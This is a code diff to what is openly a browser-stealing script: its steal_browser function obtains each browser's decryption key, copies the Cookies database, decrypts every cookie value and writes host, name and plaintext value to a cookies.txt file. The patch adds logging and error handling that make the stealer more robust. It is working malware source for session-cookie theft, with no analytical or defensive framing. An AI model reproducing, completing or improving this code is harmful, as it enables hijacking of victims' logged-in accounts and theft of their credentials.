@@ -173,6 +173,21 @@ def decrypt(buff, key):
 
 def steal_browser():
     for name, path in BROWSERS.items():
+        log_path = os.path.join(EXTRACT_FOLDER, "steal_browser_log.txt")
+        with open(log_path, "a", encoding="utf-8") as log:
+            log.write(f"--- Checking {name} ---\n")
+        
+        if not os.path.exists(path):
+            with open(log_path, "a", encoding="utf-8") as log:
+                log.write(f"Path not found: {path}\n")
+            continue
+        
+        key = get_key(path)
+        if not key:
+            with open(log_path, "a", encoding="utf-8") as log:
+                log.write(f"Failed to get decryption key for: {path}\n")
+            continue
+
         if not os.path.exists(path): continue
         key = get_key(path)
         if not key: continue
@@ -215,18 +230,21 @@ def steal_browser():
             # === COOKIES ===
             cookie_db = os.path.join(p, "Cookies")
             if os.path.exists(cookie_db):
-                shutil.copy2(cookie_db, "tmp_cookie.db")
-                conn = sqlite3.connect("tmp_cookie.db")
                 try:
+                    shutil.copy2(cookie_db, "tmp_cookie.db")
+                    conn = sqlite3.connect("tmp_cookie.db")
                     cursor = conn.cursor()
                     cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
                     with open(os.path.join(EXTRACT_FOLDER, "cookies.txt"), "a", encoding="utf-8") as f:
                         for host, name_, enc_val in cursor.fetchall():
                             decrypted = decrypt(enc_val, key)
                             f.write(f"[{name}] {host} | {name_} = {decrypted}\n")
-                except: pass
-                conn.close()
-                os.remove("tmp_cookie.db")
+                    conn.close()
+                    os.remove("tmp_cookie.db")
+                except Exception as e:
+                    with open(log_path, "a", encoding="utf-8") as log:
+                        log.write(f"[{name}] Cookie extraction failed: {e}\n")
+
 
 
 
